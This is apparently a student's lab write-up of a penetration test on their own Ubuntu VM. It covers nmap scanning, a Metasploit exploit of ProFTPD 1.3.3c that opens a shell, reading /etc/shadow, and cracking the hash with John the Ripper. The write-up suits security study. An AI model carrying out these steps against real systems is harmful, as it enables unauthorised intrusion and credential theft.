# Ubuntu-penetration-test(cracking password)
## Introduction

The Metasploit Framework, accessed through **msfconsole**, is a powerful platform used to perform penetration testing and security assessments. It is commonly used to evaluate the security of systems running on Ubuntu by simulating real-world attacks in a controlled and ethical manner. Key points include:

- **msfconsole Interface:** The main command-line interface used to interact with all Metasploit modules.
- **Vulnerability Assessment:** Helps identify security weaknesses, misconfigurations, and exploitable services on Ubuntu systems.
- **Exploit Modules:** Includes thousands of exploits that can be configured and executed for testing system defenses.
- **Payload Integration:** Supports multiple payloads for creating sessions, executing commands, and performing attack simulations.
- **Auxiliary Modules:** Provides scanners, fuzzers, and information-gathering tools for detailed security analysis.
- **Post-Exploitation Capabilities:** Offers tools for privilege escalation, system enumeration, and maintaining access during testing.



The following one is my ubuntu machine

<img width="583" height="409" alt="image" src="https://github.com/user-attachments/assets/ad76099c-03eb-4437-aa2d-9a3e11430b34" />


The first step in penetration test is to scanning which are the devices are under our local area network(lan).
The command use for scanning is 
 ```bash
sudo arp-scan –l
```
*sudo is needed because arp-scan uses raw packet sending which requires root privileges.

*arp-scan is a tool to discover devices on the local network by sending ARP requests to all IPs, and active devices reply with their IP address, MAC address, and vendor information.

*The -l option tells arp-scan to automatically detect the local subnet based on the system’s IP and netmask.

When the scanning is done it also shows vmware along with it so to find it out which system is linux we use the command
 ```bash
sudo nmap -O -vv ip
```
<img width="601" height="457" alt="image" src="https://github.com/user-attachments/assets/e4b2fdf5-d6c2-444e-a857-c4101deddba6" />

<img width="605" height="320" alt="image" src="https://github.com/user-attachments/assets/5559fc38-3f93-4550-a9b5-da7b77aa3530" />

The command below shown helps to give above output,which helps us to know 192.168.60.130 is our Ubuntu system.
 ```bash
sudo nmap -O -vv 192.168.60.130
```
If we check for other ip like 192.168.60.254 by executing the command,
```bash
sudo nmap -O -vv 192.168.60.254
```
<img width="605" height="125" alt="image" src="https://github.com/user-attachments/assets/bec46367-50fb-4fa5-8498-1603622a3109" />

This shows that 192.168.60.254 is a vmware If we check for 192.168.60.2 by,
```bash
 sudo nmap -O -vv 192.168.60.2
```
<img width="600" height="271" alt="image" src="https://github.com/user-attachments/assets/f9a23b43-ca61-47c9-b3c1-ecaf8c654647" />

This shows that 192.168.60.2 is also a vmware

*sudo is needed because OS detection (-O) requires sending raw packets, which only root or sudo can do.

*nmap is a powerful open-source network scanner used for host discovery and security auditing.

*The -O option enables OS detection by analyzing how the target responds to specially crafted packets.

*The -vv option increases verbosity and shows more detailed scan progress and results while running.


The ip address can get by using command 
```bash
ifconfig eth0
```
While scanning the vulnerabilities of machine,the report should be stored in a file,so i created a folder Ubuntu in /home/kali
```bash
mkdir ubuntu
cd ubuntu
touch report.txt
```

For scanning all ports, detecting services, identifying versions, providing detailed verbose output, and saving the results for later analysis, we use

```bash
sudo nmap -sV -p- -vv -oN /home/kali/ubuntu/report.txt 192.168.60.130
```

*	sudo → Runs the command with root privileges (needed for full port scanning).
  
*	nmap → The network scanning tool.
  
*	-sV → Detects the service and version running on open ports.
  
*	-p- → Scans all 65,535 ports (instead of just the top/common ports).
  
*	-vv → Gives very verbose output, meaning extra details during and after the scan.
  
*	-oN /home/kali/ubuntu/report.txt → Saves the results in normal output format to the file report.txt.
  
*	192.168.60.130 → The target IP address being scanned

<img width="594" height="314" alt="image" src="https://github.com/user-attachments/assets/34239184-21c9-4a2f-81a0-4d3511d67c01" />

<img width="605" height="320" alt="image" src="https://github.com/user-attachments/assets/5bfa2f93-93b3-4ca0-aa49-6a8d43000edd" />

For scanning the vulnerabilities we use,
```bash
sudo nmap -p- -sV -vv --script vuln 192.168.60.130 -oN report-port.txt
```

*	sudo → Runs the command with root privileges (needed for some advanced scans).
  
*	nmap → The network scanning tool.
  
*	-p- → Scans all 65,535 TCP ports instead of just the common ones.
  
*	-sV → Detects the service version running on each open port.
  
*	-vv → Enables very verbose output, showing detailed scan progress and results.
  
*	--script vuln → Runs Nmap’s vulnerability detection scripts (NSE) against discovered services. This checks for known security issues.
  
*	192.168.60.130 → Target IP address being scanned.
  
*	-oN report-port.txt → Saves the output in normal format to the file report-port.txt.

<img width="599" height="426" alt="image" src="https://github.com/user-attachments/assets/fa3b3297-ec50-40c9-b6fa-412319bdfc97" />

<img width="600" height="271" alt="image" src="https://github.com/user-attachments/assets/72fbf3f2-5c88-4892-b42a-776004e57f2c" />

Finally we able to find out that the vulnerability is ProFTPD 1.3.3c in port 21/tcp

Next is exploiting,by using metasploit.Metasploit’s msfconsole is the primary command-line interface of the Metasploit Framework, widely used in penetration testing. It is used to search, configure, and run exploits, payloads, and auxiliary modules, making it a powerful tool for discovering vulnerabilities, exploiting targets, and performing post-exploitation tasks.

The command used for opening msfconsole tool is 
```bash
msfconsole
```
<img width="600" height="271" alt="image" src="https://github.com/user-attachments/assets/ba0fac07-7d49-4884-b070-e8542d5801d0" />

Search our vulnerability ProFTPD 1.3.3c

<img width="600" height="271" alt="image" src="https://github.com/user-attachments/assets/af8ccb10-6f8f-4b20-bcb7-e53f17f6c1aa" />

To list all configurable settings (parameters) required by the selected exploit module. We use 
```bash
show options
```
<img width="602" height="271" alt="image" src="https://github.com/user-attachments/assets/73e1019d-cb88-403b-bda4-1f20c21ef456" />

CHOST – The local client address (only needed in special cases, often left blank). CPORT – The local client port (also optional).

Proxies – Lets you set a proxy chain if you want to run the exploit traffic through proxies.

RHOSTS (Required) – The target host IP address (this is where you specify your victim machine, e.g., 192.168.60.130).

RPORT (Required, default 21) – The target port the service is running on (here, FTP runs on port 21).

Here LHOST is not present,which is the attacking machine,so we need to change the payloads

<img width="600" height="271" alt="image" src="https://github.com/user-attachments/assets/a6eb0cde-fff2-44a2-85fc-a7b589e7ffa9" />

The LHOST and RHOSTS are set by 
```bash
set LHOST 192.168.60.131
set RHOSTS 192.168.60.130
```
The LPORT and RPORT used is initially seted one

<img width="601" height="122" alt="image" src="https://github.com/user-attachments/assets/63b32d1d-57fa-42a4-8786-baf964e6f3b5" />

Exploit using the command, 
```bash
exploit
```

<img width="596" height="165" alt="image" src="https://github.com/user-attachments/assets/3b57b87f-476c-4e31-8694-792802316b6a" />

The files or directoris are not in systematic way so exit and do exploit once more,then	14
move to 
```bash
/bin/bash
```
then to
```bash
 shell
```
<img width="596" height="198" alt="image" src="https://github.com/user-attachments/assets/490ab8ea-1c2c-4787-9ce7-cd3a1e2b4374" />

The password is now cracked.In linux systems the passwords are stored in
```bash
/etc/shadow
```

<img width="600" height="271" alt="image" src="https://github.com/user-attachments/assets/6fa3c999-8b84-476e-9d8d-845a27edcc60" />

<img width="600" height="271" alt="image" src="https://github.com/user-attachments/assets/1ab04de3-ce1a-406f-add9-19cc3ac035de" />

If the shadow file is open,

<img width="600" height="271" alt="image" src="https://github.com/user-attachments/assets/9893a2be-b979-4a24-a2e5-73d20f255597" />

The password is in hash format.We use john hash cracker tool for cracking hash value, for that we store hash value in hash.txt file

<img width="601" height="271" alt="image" src="https://github.com/user-attachments/assets/a1eafe22-6e2f-4d16-a773-6502363a353c" />

The cracked password is in hash format for cracking that hash we use command,	
```bash
john hash.txt
```
The john hash cracker tool uses rockyou.txt wordlist for cracking password.

<img width="600" height="271" alt="image" src="https://github.com/user-attachments/assets/b88c7d66-a02d-4f50-8145-f2b7dc012bf7" />

The password will be stored in 
```bash
/.john/john.pot
```

<img width="600" height="271" alt="image" src="https://github.com/user-attachments/assets/952d504b-7126-4a6c-8ad3-b374c7a78a60" />

Hence the password is **marlinspike**







